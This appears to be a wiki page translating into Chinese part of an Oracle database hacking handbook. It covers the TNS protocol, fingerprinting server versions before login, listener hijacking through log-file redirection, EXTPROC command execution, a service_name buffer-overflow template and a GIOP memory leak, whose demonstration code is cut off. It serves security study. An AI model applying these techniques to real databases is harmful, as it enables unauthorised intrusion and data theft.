<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE ANY CLASS</span><br><span class="line">EXECUTE ANY EVALUATION CONTEXT</span><br><span class="line">EXECUTE ANY INDEXTYPE</span><br><span class="line">EXECUTE ANY LIBRARY</span><br><span class="line">EXECUTE ANY OPERATOR</span><br><span class="line">EXECUTE ANY PROCEDURE</span><br><span class="line">EXECUTE ANY PROGRAM</span><br><span class="line">EXECUTE ANY RULE</span><br><span class="line">EXECUTE ANY RULE SET</span><br><span class="line">EXECUTE ANY TYPE</span><br></pre></td></tr></table></figure>

<p>​        要查明用户具有哪些特权，可以查询DBA_TAB_PRIVS和DBA_SYS_PRIVS视图。 </p>
<h3 id="Oracle-补丁"><a href="#Oracle-补丁" class="headerlink" title="Oracle 补丁"></a>Oracle 补丁</h3><p>​        2004年8月下旬，Oracle发布了期待已久的补丁集。此补丁集修复了安全研究人员（例如作者Esteban Martinez Fayo，Pete Finnigan，Jonathan Gennick，Alexander Kornbrust Stephen Kost，Matt Moore，Andy Rees和Christian Schaller）报告的数百个漏洞。它被称为Alert 68，它预示了与Oracle不同的补丁和补丁发行方法的到来。从那时起，Oracle承诺每三个月发布一次关键补丁更新（CPU）。 CPU往往包含大量的修复程序，并且只有一次（在撰写本文时）没有多次发布过CPU-即2006年7月的CPU。由于这种频率和数量，通常查找具有错误，过时补丁的服务器。结果，管理员认为实际上他们没有受到保护。甲骨文对此公开和私下提出了很多批评。</p>
<p>​        用于在除8.1.7.4以外的所有Oracle版本上安装Oracle补丁的工具称为“ opatch”。 opatch实用程序读取随补丁一起提供的名为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$PATCH/etc/config/actions</span><br></pre></td></tr></table></figure>

<p>​        的文件，该文件描述了安装操作的列表，例如要将哪些文件复制到何处。工具运行后，将更新一个名为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/inventory/ContentsXML/comps.xml</span><br></pre></td></tr></table></figure>

<p>​        的文件。除其他事项外，该文件还包含补丁集已修复的错误号的列表。不建议您依靠此文件中的信息来确定服务器是否容易受到给定漏洞的影响，因为opatch可能会失败，并且由于错误导致comps.xml中的错误导致频繁地重新发布补丁程序文件。这可能会产生误导。</p>
<p>​        确定服务器是否易受攻击的唯一肯定方法是确认服务器上是否存在易受攻击的代码。您可以通过对所有PLSQL代码进行校验和并将生成的校验和与有缺陷的软件包的已知列表进行比较来做到这一点。使用NGSSoftware的NGSSQuirreL，可以使用DBMS_UTILITY.GET_HASH_VALUE函数。这里有一个简短的解释，因此您可以根据需要自己实现。给定PLSQL包的文本跨DBA_SOURCE视图中的多行存储。对于包的每一行文本，都可以使用DBMS_UTILITY.GET_HASH_VALUE函数生成一个哈希。然后，您将获得每一行的平均值至小数点后30位：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set numwidth 50</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">AVG(DBMS_UTILITY.GET_HASH_VALUE(TEXT,1000000000,POWER(2,30)))</span><br><span class="line">AS CHECKSUM FROM DBA_SOURCE</span><br><span class="line">WHERE OWNER=&#x27;SYS&#x27; AND NAME=&#x27;TEST_F&#x27;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p><img src="/3.PNG"></p>
<h2 id="Oracle网络体系结构"><a href="#Oracle网络体系结构" class="headerlink" title="Oracle网络体系结构"></a>Oracle网络体系结构</h2><p>​        Oracle网络体系结构包含许多组件，所有组件都与OSI网络模型完全对应。这种体系结构使Oracle客户端和服务器应用程序可以通过TCP/IP等协议进行通信。在应用程序（客户端上的Oracle Call Interface或OCI和服务器上的Oracle Program Interface或OPI）与网络层之间进行接口连接的会话协议称为Net8（Net9），而在SQL * Net之前。</p>
<p>​        在OCI/OPI和Net8层之间是一个称为“双任务通用”（TTC）的表示协议，该协议负责客户端和服务器之间的字符集和数据类型转换差异。 Net8会话协议有三个组件：网络基础设施、路由/命名/验证和TNS。受支持的传输协议包括TCP / IP（带有或不带有TCP），命名管道和套接字直接协议（SDP），可通过Infiband高速网络进行通信。所有这些的基础是透明网络基板协议，也称为TNS。 TNS的任务是选择Oracle协议适配器，将通信包装在支持的传输协议中。</p>
<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/4.png"></p>
<h3 id="TNS协议"><a href="#TNS协议" class="headerlink" title="TNS协议"></a>TNS协议</h3><h4 id="TNS协议头部"><a href="#TNS协议头部" class="headerlink" title="TNS协议头部"></a>TNS协议头部</h4><p>​        每个TNS数据包都有一个八字节的标头。 头部的前两个字节（WORD）用于数据包长度-包括标头大小。 像所有值一样，大小为big-endian。 如果校验和已完成，则下一个WORD用于数据包校验和，并且此WORD的值为0x0000。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0      8       16            31</span><br><span class="line">+--------------+--------------+</span><br><span class="line">| Packet Length| Packet Chksm | </span><br><span class="line">+------+-------+--------------+   8 byte header</span><br><span class="line">| Type | Rsrvd | Header Chksm | </span><br><span class="line">+------+-------+--------------+</span><br><span class="line">|        P A Y L O A D        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>

<p>​        通用Header8个字节：</p>
<table>
<thead>
<tr>
<th>Length</th>
<th>2</th>
<th>包的长度，包括通用包头</th>
</tr>
</thead>
<tbody><tr>
<td>Packet check sum</td>
<td>2</td>
<td>包的校验和</td>
</tr>
<tr>
<td>Type</td>
<td>1</td>
<td>TNS类型</td>
</tr>
<tr>
<td>Flag</td>
<td>1</td>
<td>状态</td>
</tr>
<tr>
<td>Header check sum</td>
<td>2</td>
<td>通用头的校验和</td>
</tr>
</tbody></table>
<p>​        数据包类型（Type）例如，最常见的如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Connect packet      Type 1</span><br><span class="line">Accept packet       Type 2</span><br><span class="line">Ack packet          Type 3</span><br><span class="line">Refuse packet       Type 4</span><br><span class="line">Redirect packet     Type 5</span><br><span class="line">Data packet       	Type 6</span><br><span class="line">NULL packet         Type 7</span><br><span class="line">Abort packet      	Type 9</span><br><span class="line">Resend packet      	Type 11</span><br><span class="line">Marker packet      	Type 12</span><br><span class="line">Attention packet    Type 13</span><br><span class="line">Control packet      Type 14</span><br></pre></td></tr></table></figure>

<p>​        连接到Oracle时，客户端在TNS级别向服务器发送一个Connect数据包（类型1），指定他们希望访问的服务名称。如果侦听器知道这种服务，则可能发生以下两种情况之一：TNS侦听器可以发送一个Accept数据包（类型2），或者可以使用重定向数据包将客户端重定向到另一个端口（类型5）。如果出现前一个选项，则客户端将尝试进行身份验证。如果发生后者，则客户端将Connect数据包发送到已将其重定向到的端口，并请求访问该服务。如果一切顺利，则服务器将发出“接受”数据包并进行身份验证。所有身份验证包都是（类型6）的数据包。</p>
<p>​        如果侦听器不知道客户端正在请求访问的服务，则它将发出“Refuse”数据包（类型4）。通过身份验证后，查询和结果数据包就是“Data”数据包（类型6）。通常，会看到一个类型为12（0x0C）的数据包-这是一个标记数据包，用于中断。</p>
<p>​        例如，如果服务器希望客户端停止发送数据，则它将向客户端发送一个标记数据包。</p>
<p>​        继续TNS标头的详细信息，下一个字节是标头标志。通常，这些标志是未使用的，但是10g客户端可以将该值设置为0x04。最后两个字节构成标题校验和的WORD-默认情况下不使用，设置为0x0000：</p>
<p>​        在深入研究数据包之前，先查看一下“拒绝数据包”（类型4）会很有用。“拒绝数据包”表示某种错误。例如，带有“无效的用户名/密码”的登录被拒绝错误-ORA-01017 。 由于这些错误，第54个字节指示问题。 3是无效密码； 2表示没有这样的用户。 显然，可以从“拒绝”数据包中获得潜在有用的信息。</p>
<h4 id="TNS协议包体"><a href="#TNS协议包体" class="headerlink" title="TNS协议包体"></a>TNS协议包体</h4><p>​        网络上看到的大多数数据包都是数据包（类型6）。 对于数据包，TNS标头后的WORD用于数据标志。 如果数据包是断开连接数据包，则此WORD设置为0x0040，否则，为0x0000。</p>
<p>​        注意：当服务器处理设置了数据标志的第二位但未设置第一个（最低有效）位的数据包（类型6）（例如，数字2、6、10， 14，依此类推）。 当服务器接收到这样的数据包时，它会陷入无限循环，从而占用所有可用的CPU处理时间。</p>
<p>​        数据标志后的下一个字节（字节11）确定数据包中的内容：</p>
<p>​        0x01表示协议协商。 在此，客户端向服务器发送可接受的协议版本-分别为6、5、4、3、2、1和0。服务器将以通用版本（例如6或5）进行答复，但也会发送 信息，例如它使用的字符集，集合中有多少个字符，版本字符串和服务器标志。</p>
<p>​        0x02表示数据类型表示形式的交换。</p>
<p>​        0x03表示两任务界面（TTI）功能调用。 下表列出了一些功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x02      Open</span><br><span class="line">0x03      Query</span><br><span class="line">0x04      Execute</span><br><span class="line">0x05      Fetch</span><br><span class="line">0x08      Close</span><br><span class="line">0x09      Disconnect/logoff</span><br><span class="line">0x0C      AutoCommit ON</span><br><span class="line">0x0D      AutoCommit OFF</span><br><span class="line">0x0E      Commit</span><br><span class="line">0x0F      Rollback</span><br><span class="line">0x14      Cancel</span><br><span class="line">0x2B      Describe</span><br><span class="line">0x30      Startup</span><br><span class="line">0x31      Shutdown</span><br><span class="line">0x3B      Version</span><br><span class="line">0x43      K2 Transactions</span><br><span class="line">0x47      Query</span><br><span class="line">0x4A      OSQL7</span><br><span class="line">0x5C      OKOD</span><br><span class="line">0x5E      Query</span><br><span class="line">0x60      LOB Operations</span><br><span class="line">0x62      ODNY</span><br><span class="line">0x67      Transaction - end</span><br><span class="line">0x68      Transaction - begin</span><br><span class="line">0x69      OCCA</span><br><span class="line">0x6D      Startup</span><br><span class="line">0x51      Logon (present password)</span><br><span class="line">0x52      Logon (present username)</span><br><span class="line">0x73      Logon (present password - send AUTH_PASSWORD)</span><br><span class="line">0x76      Logon (present username - request AUTH_SESSKEY)</span><br><span class="line">0x77      Describe</span><br><span class="line">0x7F      OOTCM</span><br><span class="line">0x8B      OKPFC</span><br></pre></td></tr></table></figure>

<p>​        其中的一些可能在身份验证之前被调用，例如，版本（0x3B）TTI函数：</p>
<p>​        0x08表示“确定”，从服务器发送来响应客户端。</p>
<p>​        0x11表示扩展的TTI功能。 这些是在更高版本的Oracle中引入的，因此为了向后兼容，请勿使用0x03。以下是一些功能代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x6b      Switch or Detach session</span><br><span class="line">0x78      Close</span><br><span class="line">0x87      OSCID</span><br><span class="line">0x9A      OKEYVAL</span><br></pre></td></tr></table></figure>

<p>​        0x20，调用外部过程和服务注册。</p>
<p>​        0x44，调用外部过程和服务注册。</p>
<p>​        除了检查Oracle JDBC客户端（classes12.zip）之外，获取TNS协议的最佳方法是使用网络嗅探器从网络上捕获一些数据包，然后查看发生了什么。</p>
<h3 id="获取Oracle版本"><a href="#获取Oracle版本" class="headerlink" title="获取Oracle版本"></a>获取Oracle版本</h3><p>​        有许多方法可以在身份验证之前，获取Oracle版本号。 </p>
<h4 id="利用侦听器版本和状态命令"><a href="#利用侦听器版本和状态命令" class="headerlink" title="利用侦听器版本和状态命令"></a>利用侦听器版本和状态命令</h4><p>​        侦听器控制实用程序同时具有版本命令和状态命令。 它们都可以从客户端发出，以请求侦听器的版本号。 还显示了有关运行侦听器的操作系统的详细信息。 请注意，尽管Oracle禁止状态命令远程处理10g，但版本命令仍然有效。 这是版本命令的输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsnrctl</span><br><span class="line">set current_listener 127.0.0.1[可换成远程ip]</span><br><span class="line">version</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/5.png"></p>
<p>​        从前面的输出中，可以看到服务器正在Windows上运行11.2.0.1.0。</p>
<h4 id="利用TNS协议版本"><a href="#利用TNS协议版本" class="headerlink" title="利用TNS协议版本"></a>利用TNS协议版本</h4><p>​        在TNS连接数据包中，在数据包中找到9个字节的WORD（大小为2个字节）指定了所使用的TNS协议版本。下一个WORD（字节11和12）指定发送系统可以理解的最早的版本号。</p>
<p>​        例如，如果运行版本8.1.7.4的Oracle客户端连接到Oracle服务器上的侦听器，则客户端发送0x0136作为正在使用的TNS协议版本，并发送0x012C作为它理解的最早版本。这样，两个不同版本的Oracle可以通过选择他们都理解的TNS版本进行通信。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Oracle 10r2支持0x139</span><br><span class="line">Oracle 9r2支持0x138</span><br><span class="line">Oracle 9i支持0x137</span><br><span class="line">Oracle 8支持0x136。</span><br></pre></td></tr></table></figure>

<h4 id="利用XML数据库版本"><a href="#利用XML数据库版本" class="headerlink" title="利用XML数据库版本"></a>利用XML数据库版本</h4><p>​    如果XML数据库正在运行，则可以远程登录到TCP端口2100以获取版本信息。 此服务是ftp服务，显示信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">220 PILUM FTP Server (Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production) ready.</span><br></pre></td></tr></table></figure>

<p>​        同样，TCP端口8080上的XDB Web服务器也显示版本号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: PILUM</span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">DAV: 1,2,&lt;http://www.oracle.com/xdb/webdav/props&gt;</span><br><span class="line">Server: Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 -</span><br><span class="line">Production</span><br><span class="line"></span><br><span class="line">WWW-Authenticate: Basic Realm=&quot; XDB&quot;</span><br><span class="line">Date: Mon, 19 Jun 2006 18:57:59 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 147</span><br></pre></td></tr></table></figure>

<h4 id="利用TNS报错信息"><a href="#利用TNS报错信息" class="headerlink" title="利用TNS报错信息"></a>利用TNS报错信息</h4><p>​        如果侦听器收到它不理解的TNS命令，则会将错误发送回去。 此错误文本包含一个VSNNUM，该VSNNUM包含一个十进制数字，例如169869568。如果我们将此数字转换为十六进制，请查看得到的内容：0x0A200100。 这是伪装的Oracle版本号-在本例中为10.2.0.1.0。 以下shell程序转储来自于不理解“unbreakable”命令的侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 181</span><br><span class="line">      Identifier: 13914</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x41e5</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.59</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 3004</span><br><span class="line">      Sequence: 1152664576</span><br><span class="line">      ack: 2478634793</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 17451</span><br><span class="line">      Checksum: 0xcae1</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 8d 00 00 04 00 00 00 22 00 00 81 28 44 45 53          &quot;   (DES</span><br><span class="line">      43 52 49 50 54 49 4f 4e 3d 28 45 52 52 3d 31 31  CRIPTION=(ERR=11</span><br><span class="line">      35 33 29 28 56 53 4e 4e 55 4d 3d 31 36 39 38 36  53)(VSNNUM=16986</span><br><span class="line">      39 35 36 38 29 28 45 52 52 4f 52 5f 53 54 41 43  9568)(ERROR_STAC</span><br><span class="line">      4b 3d 28 45 52 52 4f 52 3d 28 43 4f 44 45 3d 31  K=(ERROR=(CODE=1</span><br><span class="line">      31 35 33 29 28 45 4d 46 49 3d 34 29 28 41 52 47  153)(EMFI=4)(ARG</span><br><span class="line">      53 3d 27 75 6e 62 72 65 61 6b 61 62 6c 65 27 29  S=&#x27;unbreakable&#x27;)</span><br><span class="line">      29 28 45 52 52 4f 52 3d 28 43 4f 44 45 3d 33 30  )(ERROR=(CODE=30</span><br><span class="line">      33 29 28 45 4d 46 49 3d 31 29 29 29 29           3)(EMFI=1))))</span><br></pre></td></tr></table></figure>

<h4 id="利用TNS的TTC功能"><a href="#利用TNS的TTC功能" class="headerlink" title="利用TNS的TTC功能"></a>利用TNS的TTC功能</h4><p>​        我们之前讨论了TTC功能，并提到了版本功能0x3B。 这将导致Oracle服务器在认证之前显示其版本。</p>
<p>​        <strong>使用其他网络选项协商</strong></p>
<p>​        客户端从服务器接收到“接受”数据包后，客户端可以选择协商其他网络服务，例如身份验证，加密，数据完整性和管理程序。 可以在ANO协商标头（0xDEADBEEF）后三个字节找到客户端或服务器的版本-数据包中的17个字节。 在以下数据中，可以看到版本为8.1.7.4：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 203</span><br><span class="line">      Identifier: 14473</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x3fa0</span><br><span class="line">      Source IP: 192.168.0.59</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 4194</span><br><span class="line">      Dest port: 1495</span><br><span class="line">      Sequence: 422372252</span><br><span class="line">      ack: 597087647</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 65087</span><br><span class="line">      Checksum: 0x7e36</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 a3 00 00 06 00 00 00 00 00 de ad be ef 00 99</span><br><span class="line">      08 10 74 00 00 04 00 00 04 00 03 00 00 00 00 00    t</span><br><span class="line">      04 00 05 08 10 74 00 00 02 00 06 00 1f 00 0e 00       t</span><br><span class="line">      01 de ad be ef 00 03 00 00 00 02 00 04 00 01 00</span><br><span class="line">      01 00 07 00 00 00 00 00 04 00 05 08 10 74 00 00              t</span><br><span class="line">      02 00 06 fa ff 00 01 00 02 01 00 03 00 00 4e 54               NT</span><br><span class="line">      53 00 04 00 05 02 00 00 00 00 04 00 04 00 00 00  S</span><br><span class="line">      00 00 04 00 04 00 00 00 02 00 02 00 02 00 00 00</span><br><span class="line">      00 00 04 00 05 08 10 74 00 00 01 00 02 00 00 03        t</span><br><span class="line">      00 02 00 00 00 00 00 04 00 05 08 10 74 00 00 01             t</span><br><span class="line">      00 02 00</span><br></pre></td></tr></table></figure>

<h2 id="攻击TNS侦听器和调度程序"><a href="#攻击TNS侦听器和调度程序" class="headerlink" title="攻击TNS侦听器和调度程序"></a>攻击TNS侦听器和调度程序</h2><p>​        TNS侦听器是所有Oracle通信的枢纽。</p>
<h3 id="TNS劫持攻击"><a href="#TNS劫持攻击" class="headerlink" title="TNS劫持攻击"></a>TNS劫持攻击</h3><p>​        10g之前的TNS侦听器可以直接进行远程管理，而无需提供密码。 由于可以指定日志文件和跟踪文件的位置，因此攻击者可以将日志文件设置为例如Windows管理员启动文件夹中的批处理文件或Oracle用户主目录中的.rhosts文件。Linux上的目录。 设置好之后，攻击者可以发送命令运行，或者在Linux上发送“ + +”命令，使这些命令执行，或者能够使用r *服务以Oracle用户身份运行命令。 </p>
<p>​        除了能够设置密码来管理侦听器外，Oracle还向侦听器添加了另一个选项-ADMIN_RESTRICTIONS。 启用后，某些命令（例如更改日志文件的位置）只能在本地执行。 有关详细信息，请访问<a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html%E3%80%82">www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html。</a></p>
<p>​        除此之外，TNS侦听器还遭受许多缓冲区溢出漏洞的困扰。 例如，在2002年6月，Oracle解决了9i中的一个溢出问题，该溢出中过长的service_name参数将触发该问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(DESCRIPTION=(ADDRESS=</span><br><span class="line">(PROTOCOL=TCP)(HOST=192.168.0.65)	</span><br><span class="line">(PORT=1521))(CONNECT_DATA=</span><br><span class="line">(SERVICE_NAME=shellcode_goes_here) 	</span><br><span class="line">(CID=</span><br><span class="line">(PROGRAM=SQLPLUS.EXE)</span><br><span class="line">(HOST=foo)(USER=bar))))</span><br></pre></td></tr></table></figure>

<p>​        发生错误是因为在将错误写入日志文件时，用户提供的service_name被复制到基于堆栈的缓冲区中。 攻击者可能利用此漏洞来控制流程的执行路径。</p>
<p>​        可以在没有用户ID和密码的情况下针对TNS侦听器发动的另一种攻击，将诱使服务器加载任意库并执行任意功能。对于Oracle 8.1.7.4，它仍未打补丁，尽管存在严重的安全隐患，Oracle仍拒绝对其进行修复。攻击方法包括连接到侦听器并请求访问EXTPROC，EXTPROC是用于运行PLSQL外部过程的程序。因为没有身份验证，并且因为可以通过TCP到达EXTPROC，所以可以加载例如msvcrt.dll或libc，并执行system（）函数和任意操作系统命令。对于Oracle 9和更高版本，Oracle制作了一个补丁程序，但该补丁程序存在缓冲区溢出漏洞。该补丁添加了代码，以捕获攻击者尝试远程加载库然后进行记录的记录，但是记录代码使用了sprintf（）。通过提供一个过长的库名，基于堆栈的缓冲区可能会溢出，从而使攻击者获得控制权。第二个补丁不是很好。通过将环境变量嵌入库名称中，可以通过长度检查。此后，环境变量将被扩展，从而推出了用户提供的字符串的长度。同样，可能会使缓冲区溢出。</p>
<h3 id="攻击-GIOP服务器"><a href="#攻击-GIOP服务器" class="headerlink" title="攻击 GIOP服务器"></a>攻击 GIOP服务器</h3><p>​        默认情况下，Oracle 9.0.1和Oracle 8.1.7.4都安装了IIOP（Internet内部对象请求代理协议）服务器以启用对CORBA应用程序的访问。 IIOP是GIOP（公用对象请求代理协议）的实现。该服务器中的漏洞可能允许攻击者通过网络从服务器中转储任意内存或使服务器崩溃。 </p>
<p>​        GIOP数据包的标头有一个size，它指示客户端正在发送多少数据。服务器使用此大小参数来构建其响应。如果客户端发送的大小大于其实际发送的数据，则服务器将读取内存中的数据，直到攻击者指定的大小为止。这样，攻击者就可以开始泄漏TNS侦听器的内存内容。如果大小足够大，则侦听器最终会尝试读取未初始化的内存，并且访问会导致拒绝服务。以下代码演示了这一点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 